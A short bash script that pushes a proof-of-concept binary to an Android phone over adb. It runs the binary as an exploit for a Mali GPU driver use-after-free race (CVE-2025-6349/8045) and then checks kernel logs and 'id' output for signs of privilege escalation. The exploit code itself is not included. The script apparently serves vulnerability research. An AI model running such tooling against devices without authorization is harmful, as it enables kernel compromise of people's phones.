#!/bin/bash
set -e

POC_PATH="/home/unlockerplus/.kilo/skills/shaby-tech-bug-hunter"
POC_BIN="mali_pixel9_poc"
TIMEOUT="${1:-3071}"
DEVICE="${2:-}"
ADB="adb"
[ -n "$DEVICE" ] && ADB="adb -s $DEVICE"

echo "=== CVE-2025-6349/8045 POC Test ==="
echo "Binary: $POC_BIN"
echo "Timeout: ${TIMEOUT}ms"
echo ""

if ! $ADB devices 2>&1 | grep -q "device$"; then
    echo "[-] No device connected"
    exit 1
fi

echo "[*] Device: $($ADB shell getprop ro.product.model 2>/dev/null)"
echo "[*] Android: $($ADB shell getprop ro.build.version.release 2>/dev/null)"
echo "[*] Mali driver: $($ADB shell getprop ro.hardware.chipname 2>/dev/null)"
echo ""

echo "[*] Deploying $POC_BIN..."
$ADB push $POC_PATH/$POC_BIN /data/local/tmp/
$ADB shell chmod +x /data/local/tmp/$POC_BIN

$ADB shell dmesg -C 2>/dev/null || true

echo "[*] Running exploit (timeout=${TIMEOUT}ms)..."
echo ""
$ADB shell /data/local/tmp/$POC_BIN $TIMEOUT 2>&1 || true

echo ""
echo "[*] Checking dmesg for UAF indicators..."
$ADB shell dmesg | grep -iE "(kasan|use-after-free|double-free|slab|mali|kbase|kbase_csf)" | tail -30 || echo "(no indicators)"

echo ""
echo "[*] Current privileges:"
$ADB shell id

echo ""
echo "[*] To run with different timeout:"
echo "    $0 <timeout_ms> [device_serial]"
echo ""
echo "[*] Recommended timeout values: 3071 (default), 5000, 8000, 10000"
echo "[*] The race window is narrow - may need multiple runs"
